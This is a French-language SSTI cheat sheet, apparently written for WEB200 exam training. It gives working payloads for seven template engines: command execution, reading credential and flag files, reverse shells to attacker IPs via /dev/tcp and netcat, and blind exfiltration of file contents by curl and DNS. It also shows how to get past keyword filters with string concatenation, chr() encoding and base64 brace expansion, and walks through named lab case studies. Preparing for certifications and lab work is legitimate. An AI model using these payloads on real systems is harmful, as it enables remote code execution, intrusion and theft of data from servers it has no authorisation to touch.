# 🎭 FICHE 11 - SERVER-SIDE TEMPLATE INJECTION (SSTI)

## 📋 Table des matières

1. [Moteurs de Templates](#1-moteurs-de-templates)
2. [Discovery & Identification](#2-discovery--identification)
3. [Twig (PHP)](#3-twig-php)
4. [Freemarker (Java)](#4-freemarker-java)
5. [Pug (JavaScript)](#5-pug-javascript)
6. [Jinja (Python)](#6-jinja-python)
7. [Handlebars (JavaScript)](#7-handlebars-javascript)
8. [Mako (Python)](#8-mako-python)
9. [EJS (Node.js)](#9-ejs-nodejs)
10. [Cheat Sheet Rapide](#10-cheat-sheet-rapide)

---

## 1. Moteurs de Templates

### 1.1 Par Langage

| Engine     | Language    | Side   | RCE Difficulty |
| ---------- | ----------- | ------ | -------------- |
| Twig       | PHP         | Server | Medium         |
| Freemarker | Java        | Server | Easy           |
| Pug/Jade   | JavaScript  | Server | Medium         |
| Jinja      | Python      | Server | Hard           |
| Handlebars | JavaScript  | Both   | Hard           |
| Mustache   | Multiple    | Varies | Very Hard      |
| **Mako**   | **Python**  | Server | **Easy**       |
| **EJS**    | **Node.js** | Server | **Medium**     |

### 1.2 Syntaxe de Base

**Expressions (output) :**

```
{{ variable }}           # Twig, Jinja, Handlebars
${ variable }            # Freemarker, Mako
#{ variable }            # Pug
<%= variable %>          # EJS, ERB
```

**Statements (logique) :**

```
{% if condition %}       # Twig, Jinja
<# if condition>         # Freemarker
- if condition           # Pug
{{#if condition}}        # Handlebars
<% if condition %>       # EJS, ERB
```

---

## 2. Discovery & Identification

### 2.1 Payloads de Test Initiaux

**Tests mathématiques :**

```
{{ 7*7 }}
${ 7*7 }
#{ 7*7 }
<%= 7*7 %>
${7*7}
```

**Tests avec strings :**

```
{{ 7*'7' }}
${ 7*"7" }
{{ "7"*7 }}
<%= "7"*7 %>
```

### 2.2 Identification par Résultat

| Payload       | Résultat    | Engine Probable                   |
| ------------- | ----------- | --------------------------------- |
| `{{ 7*7 }}`   | `49`        | Twig, Jinja, Nunjucks, Handlebars |
| `{{ 7*7 }}`   | `{{ 7*7 }}` | Pas de template ou autre engine   |
| `{{ 7*'7' }}` | `49`        | **Twig**                          |
| `{{ 7*'7' }}` | `7777777`   | **Jinja**                         |
| `${ 7*7 }`    | `49`        | Freemarker, **Mako**, Groovy      |
| `${ 7*"7" }`  | `49`        | Freemarker                        |
| `${ 7*"7" }`  | `7777777`   | **Mako**                          |
| `#{ 7*7 }`    | `<49>`      | **Pug**                           |
| `<%= 7*7 %>`  | `49`        | **EJS**, ERB (Ruby)               |

### 2.3 Tests Spécifiques

**Twig :**

```
{{ 5 * 5 }}        → 25
{{ 5 * '5' }}      → 25
```

**Freemarker :**

```
${ 5*5 }           → 25
${ 5*"5" }         → Error (type mismatch)
```

**Jinja :**

```
{{ 5*5 }}          → 25
{{ 5*"5" }}        → 55555
{{ request }}      → <Request 'http://...' [POST]>
```

**Mako :**

```
${ 5*5 }           → 25
${ 5*"5" }         → 55555
${self}            → <template.Template object at 0x...>
```

**Pug :**

```
#{ 7*7 }           → <49>
```

**EJS :**

```
<%= 7*7 %>                    → 49
<%= "test".toUpperCase() %>   → TEST
<%= global.process.version %> → v18.19.0
```

---

## 3. Twig (PHP)

### 3.1 Discovery

```twig
{{ 5 * 5 }}
→ Résultat : 25

{{ 5 * '5' }}
→ Résultat : 25 (Twig convertit)
```

### 3.2 Exploitation - Filtres Dangereux

**Filter map :**

```twig
{{[0]|map('system','whoami')}}
{{[0]|map('system','id')}}
{{[0]|map('system','cat /etc/passwd')}}
{{[0]|map('system','ls -la')}}
```

**Filter reduce :**

```twig
{{[0]|reduce('system','whoami')}}
{{[0]|reduce('system','id')}}
{{[0]|reduce('shell_exec','cat /var/www/flag.txt')}}
```

**Filter sort :**

```twig
{{[0]|sort('system','whoami')}}
```

### 3.3 Exploitation Avancée

**Avec shell_exec :**

```twig
{{[0]|reduce('shell_exec','cat /var/www/flag.txt')}}
{{[0]|reduce('shell_exec','cat /etc/passwd')}}
```

**Reverse shell :**

```twig
{{[0]|reduce('system','bash -c "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"')}}
```

### 3.4 Blind Twig (avec exfiltration)

**Setup :**

```twig
{% set output %}
{{[0]|reduce('system','cat /flag.txt')}}
{% endset %}
{% set exfil = output| url_encode %}
{{[0]|reduce('system','curl http://ATTACKER-IP/?exfil=' ~ exfil)}}
```

---

## 4. Freemarker (Java)

### 4.1 Discovery

```freemarker
${ 5*5 }
→ Résultat : 25

${ 5*"5" }
→ Résultat : Error (type mismatch)
```

### 4.2 Exploitation - Execute Class

**Basique :**

```freemarker
${"freemarker.template.utility.Execute"?new()("whoami")}
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
```

**Lecture de fichiers :**

```freemarker
${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}
${"freemarker.template.utility.Execute"?new()("cat /flag.txt")}
```

### 4.3 Bypass avec Base64

**Problème :** Certains caractères spéciaux (espaces, symboles) peuvent être échappés.

**Solution :** Encoder la commande en base64

```bash
# Sur Kali
echo "bash -i >& /dev/tcp/192.168.45.230/4444 0>&1" | base64
# Résultat : YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzMC80NDQ0IDA+JjEK
```

**Payload avec brace expansion :**

```freemarker
${"freemarker.template.utility.Execute"?new()("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzMC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}")}
```

**Pourquoi {echo,BASE64} ?**

- Les accolades `{}` évitent l'échappement des espaces
- Bash interprète `{echo,xxx}` comme `echo xxx`
- Pas d'espaces = pas de problème d'échappement !

### 4.4 Reverse Shell Complet

**1. Listener Kali :**

```bash
nc -nlvp 4444
```

**2. Payload Freemarker :**

```freemarker
${"freemarker.template.utility.Execute"?new()("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzMC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}")}
```

---

## 5. Pug (JavaScript)

### 5.1 Discovery

```pug
#{ 7*7 }
→ Résultat : <49>

#{ "7"*7 }
→ Résultat : <NaN>
```

### 5.2 Exploitation - require()

**Setup require :**

```pug
- var require = global.process.mainModule.require
```

**Commandes système :**

```pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('whoami').stdout
```

**Lecture de fichiers :**

```pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('cat', ['/etc/passwd']).stdout
= require('child_process').spawnSync('cat', ['/root/flag.txt']).stdout
```

### 5.3 Payload Complet

```pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('cat', ['/root/flag.txt']).stdout
```

---

## 6. Jinja (Python)

### 6.1 Discovery

```jinja
{{ 5*5 }}
→ Résultat : 25

{{ 5*"5" }}
→ Résultat : 55555

{{ request }}
→ Résultat : <Request 'http://...' [POST]>
```

### 6.2 Data Exfiltration

**Config dump :**

```jinja
{{ config }}
{{ config|pprint }}
```

**Affiche toutes les variables d'environnement et config de l'app**

### 6.3 RCE (Avancé)

**Via **subclasses** :**

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Exploitation complète (complexe) :**

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}
```

**Note :** L'index `[396]` varie selon l'environnement. Il faut énumérer les subclasses.

---

## 7. Handlebars (JavaScript)

### 7.1 Discovery

```handlebars
{{ 7*7 }}
→ Résultat : 49
```

### 7.2 Exploitation - Helper Functions

**readdir (lire répertoire) :**

```handlebars
{{#each (readdir "/etc")}}
  {{this}}
{{/each}}
```

**read (lire fichier) :**

```handlebars
{{#each (readdir "/secret/")}}
  {{read this}}
{{/each}}
```

### 7.3 Exploitation Complète

**Lister + lire :**

```handlebars
{{#each (readdir "/secret/")}}
  File: {{this}}
  Content: {{read this}}
{{/each}}
```

---

## 8. Mako (Python)

### 8.1 Discovery

```python
${ 7*7 }
→ Résultat : 49

${ 7*"7" }
→ Résultat : 7777777

${self}
→ Résultat : <template.Template object at 0x...>
```

### 8.2 Reconnaissance

**Lister les objets disponibles :**

```python
${dir(self)}
${self.__dict__}
${self.module}
${self.module.cache}
${context}
${UNDEFINED}
```

### 8.3 Exploitation - Accès OS Module

**Via self.module.cache.util :**

```python
# Commande simple (pas d'output visible)
${self.module.cache.util.os.system('id')}

# Avec output (recommandé ✓)
${self.module.cache.util.os.popen('whoami').read()}
${self.module.cache.util.os.popen('id').read()}
${self.module.cache.util.os.popen('cat /etc/passwd').read()}
```

**Via import direct :**

```python
${__import__('os').popen('whoami').read()}
${__import__('os').system('id')}
${__import__('subprocess').check_output('id', shell=True)}
```

### 8.4 Lecture de Fichiers

```python
${self.module.cache.util.os.popen('cat /root/proof.txt').read()}
${self.module.cache.util.os.popen('cat /home/*/local.txt').read()}
${self.module.cache.util.os.popen('find / -name "*.txt" 2>/dev/null').read()}
```

### 8.5 Bypass de Filtres

**Problème :** Si les mots-clés sont filtrés (`os`, `system`, `popen`, etc.)

**Solution 1 : Concaténation ASCII avec chr() :**

```python
# Construire "id" dynamiquement : chr(105)='i', chr(100)='d'
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}

# Construire "whoami" : w=119, h=104, o=111, a=97, m=109, i=105
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[119,104,111,97,109,105])).read()}

# Construire "cat /etc/passwd"
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[99,97,116,32,47,101,116,99,47,112,97,115,115,119,100])).read()}
```

**Solution 2 : String manipulation :**

```python
# Bypass "process" filtré
${'pro'+'cess'}

# Bypass "os" filtré
${'o'+'s'}
```

**Solution 3 : Base64 (si disponible) :**

```python
${__import__('base64').b64decode('d2hvYW1p').decode()}  # "whoami"
```

**Astuce pour générer les codes ASCII :**

```bash
# Sur Kali - générer les codes ASCII d'une commande
echo -n "whoami" | od -A n -t u1 | tr -d ' \n'
# Résultat : 119104111097109105
```

### 8.6 Reverse Shell

**Setup listener :**

```bash
nc -nvlp 4444
```

**Payload Mako basique :**

```python
${self.module.cache.util.os.popen('bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"').read()}
```

**Avec bypass si filtres :**

```python
# Construire la commande reverse shell en ASCII
# bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[98,97,115,104,32,45,99,32,34,98,97,115,104,32,45,105,32,62,38,32,47,100,101,118,47,116,99,112,47,49,57,50,46,49,54,56,46,52,53,46,50,48,52,47,52,52,52,52,32,48,62,38,49,34])).read()}
```

### 8.7 Blind Mako (exfiltration)

**Via curl :**

```python
${self.module.cache.util.os.popen('curl http://ATTACKER-IP/?flag=$(cat /flag.txt|base64)').read()}
```

**Via DNS :**

```python
${self.module.cache.util.os.popen('nslookup $(cat /flag.txt).ATTACKER-DOMAIN').read()}
```

### 8.8 Cas Pratique - Lab Glaucidium

**Contexte :** Formulaire de création de news utilisant Mako  
**Payload testé :**

```python
${self.module.cache.util.os.popen('id').read()}
→ Résultat : uid=0(root) gid=0(root) groups=0(root)...
```

**Récupération des flags :**

```python
${self.module.cache.util.os.popen('cat /root/proof.txt').read()}
${self.module.cache.util.os.popen('cat /home/*/local.txt').read()}
```

---

## 9. EJS (Node.js)

### 9.1 Discovery

```javascript
<%= 7*7 %>
→ Résultat : 49

<%= "test".toUpperCase() %>
→ Résultat : TEST

<%= global.process.version %>
→ Résultat : v18.19.0 (ou version Node)
```

### 9.2 Syntaxe EJS

|Syntaxe|Fonction|Exemple|
|---|---|---|
|`<%= ... %>`|Output HTML-escaped|`<%= 7*7 %>` → `49`|
|`<%- ... %>`|Output non-escaped (raw HTML)|`<%- "<script>alert(1)</script>" %>`|
|`<% ... %>`|Execute code (pas d'output)|`<% var x = 5; %>`|
|`<%# ... %>`|Commentaire|`<%# ceci est un commentaire %>`|

### 9.3 Exploitation Basique

**Test d'exécution :**

```javascript
<%= global.process %>
<%= global.process.mainModule %>
```

**Commandes système simples :**

```javascript
<%= global.process.mainModule.require('child_process').execSync('id') %>
<%= global.process.mainModule.require('child_process').execSync('whoami').toString() %>
<%= global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>
```

### 9.4 Bypass de Filtres

**Problème :** Certains mots-clés peuvent être filtrés :

```javascript
// Filtres courants (exemple du lab Fullmoon)
function filterTemplate(req, res, next) {
    req.body.content = req.body.content.replace(/process/g, '');
    req.body.content = req.body.content.replace(/require/g, '');
    req.body.content = req.body.content.replace(/exec/g, '');
    next();
}
```

**Solution : Concaténation de strings :**

```javascript
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('whoami').toString() %>
```

**Explication du bypass :**

- `'pro'+'cess'` → devient `process` APRÈS le filtre
- Le filtre cherche la string exacte `process`, il ne la trouve pas !
- Marche pour tous les mots filtrés

**Exemples de bypass :**

```javascript
// Bypass "process"
global['pro'+'cess']

// Bypass "require"
['req'+'uire']

// Bypass "exec"
['ex'+'ecSync']

// Bypass "child_process"
'child_'+'pro'+'cess'
```

### 9.5 RCE Complet avec Bypass

**Payload de test :**

```javascript
<%= 'pro'+'cess' %>
→ Si tu vois "process" affiché, le bypass fonctionne !
```

**Whoami avec bypass :**

```javascript
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('whoami').toString() %>
```

**Lecture de fichiers :**

```javascript
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('cat /etc/passwd').toString() %>
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('find / -name local.txt 2>/dev/null').toString() %>
```

### 9.6 Reverse Shell

**Setup listener :**

```bash
nc -nvlp 4444
```

**Payload EJS :**

```javascript
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('bash -c "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1"').toString() %>
```

**Alternative avec netcat :**

```javascript
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('nc 192.168.45.204 4444 -e /bin/bash').toString() %>
```

### 9.7 Blind EJS (sans output visible)

**Via curl :**

```javascript
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('curl http://ATTACKER-IP/?data=$(cat /flag.txt|base64)') %>
```

**Via DNS exfiltration :**

```javascript
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('nslookup $(cat /flag.txt).ATTACKER-DOMAIN') %>
```

### 9.8 Cas Pratique - Lab Fullmoon

**Contexte :** Éditeur de template EJS avec filtres sur `process`, `require`, `exec`

**Filtres identifiés :**

```javascript
// Backend filter
req.body.content = req.body.content.replace(/process/g, '');
req.body.content = req.body.content.replace(/require/g, '');
req.body.content = req.body.content.replace(/exec/g, '');
```

**Payload final fonctionnel :**

```javascript
<h1>RCE Bypass</h1>
<pre>
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('id; whoami; pwd; ls -la').toString() %>
</pre>
```

**Résultat obtenu :**

```
uid=1000(user) gid=1000(user) groups=1000(user)
user
/app
total 1234
...
```

### 9.9 Alternative : Constructeur Function (avancé)

**Si les autres méthodes échouent :**

```javascript
<%= this.constructor.constructor('return global.pro'+'cess.mainModule.req'+'uire("child_'+'pro'+'cess").ex'+'ecSync("whoami")')().toString() %>
```

**Pourquoi ça marche ?**

- `this.constructor.constructor` = `Function` constructor
- Permet d'exécuter du code arbitraire
- Bypass certains sandbox

---

## 10. Cheat Sheet Rapide

### 10.1 Workflow Standard

```
1. IDENTIFIER LE MOTEUR
   → Tester {{ 7*7 }}, ${ 7*7 }, #{ 7*7 }, <%= 7*7 %>
   → Observer le résultat

2. CONFIRMER AVEC STRINGS
   → {{ 7*'7' }} pour Twig vs Jinja
   → ${ 7*"7" } pour Freemarker vs Mako
   → <%= "test" %> pour EJS

3. TESTER LES OBJETS SPÉCIFIQUES
   → ${self} pour Mako
   → <%= global.process %> pour EJS
   → {{ request }} pour Jinja

4. EXPLOITER SELON LE MOTEUR
   → Twig : filters (map, reduce, sort)
   → Freemarker : Execute class
   → Pug : require + spawnSync
   → Jinja : config dump ou subclasses
   → Handlebars : readdir + read
   → Mako : self.module.cache.util.os.popen
   → EJS : global.process.mainModule.require

5. BYPASS LES FILTRES SI NÉCESSAIRE
   → String concatenation : 'pro'+'cess'
   → ASCII encoding : chr(105) = 'i'
   → Base64 encoding

6. OBTENIR RCE
   → Commandes système
   → Reverse shell si possible
   → Exfiltration blind si pas d'output

7. EXFILTRER DATA
   → Flags, configs, secrets
```

### 10.2 Payloads Rapides par Moteur

**Twig - Test rapide :**

```twig
{{[0]|reduce('system','id')}}
```

**Freemarker - Test rapide :**

```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
```

**Pug - Test rapide :**

```pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('id').stdout
```

**Jinja - Test rapide :**

```jinja
{{ config }}
```

**Handlebars - Test rapide :**

```handlebars
{{#each (readdir "/")}}{{this}}{{/each}}
```

**Mako - Test rapide :**

```python
${self.module.cache.util.os.popen('id').read()}
```

**EJS - Test rapide :**

```javascript
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

### 10.3 RCE Rapid Fire

**Twig :**

```twig
{{[0]|reduce('system','cat /flag.txt')}}
```

**Freemarker :**

```freemarker
${"freemarker.template.utility.Execute"?new()("cat /flag.txt")}
```

**Pug :**

```pug
- var require = global.process.mainModule.require
= require('child_process').spawnSync('cat', ['/flag.txt']).stdout
```

**Mako :**

```python
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

**EJS :**

```javascript
<%= global.process.mainModule.require('child_process').execSync('cat /flag.txt').toString() %>
```

### 10.4 Reverse Shells

**Twig :**

```twig
{{[0]|reduce('system','bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"')}}
```

**Freemarker (avec base64) :**

```bash
# Encode la commande
echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
```

```freemarker
${"freemarker.template.utility.Execute"?new()("bash -c {echo,BASE64}|{base64,-d}|{bash,-i}")}
```

**Mako :**

```python
${self.module.cache.util.os.popen('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"').read()}
```

**EJS :**

```javascript
<%= global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"') %>
```

### 10.5 Bypass Techniques

|Engine|Filtre|Bypass|
|---|---|---|
|Mako|`os`, `system`, `popen`|`str().join(chr(i)for(i)in[105,100])`|
|EJS|`process`, `require`|`global['pro'+'cess'].mainModule['req'+'uire']`|
|Freemarker|Espaces, caractères|Base64 + brace expansion `{echo,BASE64}\|{base64,-d}`|
|Jinja|Double underscores|Utiliser `request` ou `config`|

---

## 📝 Notes Importantes

### Identification Rapide

|Test|Twig|Jinja|Freemarker|Pug|Mako|EJS|
|---|---|---|---|---|---|---|
|`{{ 7*7 }}`|49|49|N/A|N/A|N/A|N/A|
|`{{ 7*'7' }}`|49|7777777|N/A|N/A|N/A|N/A|
|`${ 7*7 }`|N/A|N/A|49|N/A|49|N/A|
|`${ 7*"7" }`|N/A|N/A|Error|N/A|7777777|N/A|
|`#{ 7*7 }`|N/A|N/A|N/A|`<49>`|N/A|N/A|
|`<%= 7*7 %>`|N/A|N/A|N/A|N/A|N/A|49|

### Limites Communes

**Twig :**

- Certains filtres peuvent être désactivés
- sandbox mode peut bloquer system()

**Freemarker :**

- Execute class peut être blacklistée
- Base64 bypass souvent nécessaire

**Jinja :**

- RCE complexe via **subclasses**
- Index varie selon l'environnement

**Handlebars :**

- RCE difficile, principalement LFI
- Dépend des helpers disponibles

**Mako :**

- Filtres sur mots-clés courants (`os`, `system`)
- Bypass ASCII nécessaire mais efficace

**EJS :**

- Filtres fréquents sur `process`, `require`, `exec`
- String concatenation bypass très efficace

### Priorités WEB200

1. **Identifier le moteur rapidement** (tests mathématiques + strings)
2. **Maîtriser Twig, Freemarker, Mako, EJS** (les plus exploitables)
3. **Connaître les bypasses** :
    - Base64 (Freemarker)
    - ASCII/chr (Mako)
    - String concatenation (EJS)
4. **Blind exploitation** avec curl/DNS
5. **Data exfiltration** (Jinja config, Mako self)

### Conseils Pratiques

- **Burp Repeater** pour tester les payloads
- Toujours **URL encoder** les payloads complexes
- **Tester plusieurs syntaxes** si le premier test échoue
- **Noter le moteur identifié** pour exploitation ciblée
- **Chercher les filtres** en testant des mots-clés suspects
- Pour **Mako/EJS avec filtres**, penser **bypass immédiatement**
- **Blind SSTI** : tester avec `curl` vers ton IP d'abord

### Fichiers à Cibler

```
/flag.txt
/root/flag.txt
/root/proof.txt
/home/*/local.txt
/var/www/flag.txt
/etc/passwd
/app/config.ini
/.env
/proc/self/environ
```

### Commandes Utiles

**Générer codes ASCII (pour bypass Mako) :**

```bash
echo -n "whoami" | od -A n -t u1 | tr -d ' \n'
# Résultat : 119104111097109105
```

**Encoder base64 (pour bypass Freemarker) :**

```bash
echo "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1" | base64
```

**Listener reverse shell :**

```bash
nc -nvlp 4444
```

---

## 🎯 Case Studies

### Lab Fullmoon (EJS avec filtres)

**URL :** http://fullmoon/  
**Credentials :** user/password (créer compte)  
**Endpoint :** Template editor dans les settings

**Filtres identifiés :**

```javascript
filterTemplate(req, res, next) {
    req.body.content = req.body.content.replace(/process/g, '');
    req.body.content = req.body.content.replace(/require/g, '');
    req.body.content = req.body.content.replace(/exec/g, '');
    next();
}
```

**Payload fonctionnel :**

```javascript
<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString() %>
```

### Lab Glaucidium (Mako)

**URL :** http://glaudicium/  
**Credentials :** admin (créer via SSRF + Gopher)  
**Endpoint :** Formulaire création de news

**Payload fonctionnel :**

```python
${self.module.cache.util.os.popen('id').read()}
→ uid=0(root) gid=0(root) groups=0(root)...
```

**Récupération flags :**

```python
${self.module.cache.util.os.popen('cat /root/proof.txt').read()}
```

### Lab Halo (Freemarker)

**URL :** http://halo/admin  
**Credentials :** admin/password  
**Endpoint :** Theme editing (404.ftl)

**Payload :**

```freemarker
${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}
```

### Lab Craft CMS (Twig Blind)

**URL :** http://craft/  
**SMTP Catcher :** http://craft:8025/

**Blind exploitation :**

```twig
{% set output %}
{{[0]|reduce('system','cat /flag.txt')}}
{% endset %}
{% set exfil = output| url_encode %}
{{[0]|reduce('system','curl http://ATTACKER-IP/?exfil=' ~ exfil)}}
```

---

## 🔗 Ressources Utiles

- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- **HackTricks SSTI** : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- **Mako Documentation** : https://docs.makotemplates.org/
- **EJS Documentation** : https://ejs.co/
- **PortSwigger SSTI** : https://portswigger.net/web-security/server-side-template-injection

---

**🎯 Bon courage pour la préparation intensive !**  
**📅 Période : 26 janvier - 13 mars 2026**  
**💪 Team Isis - WEB200**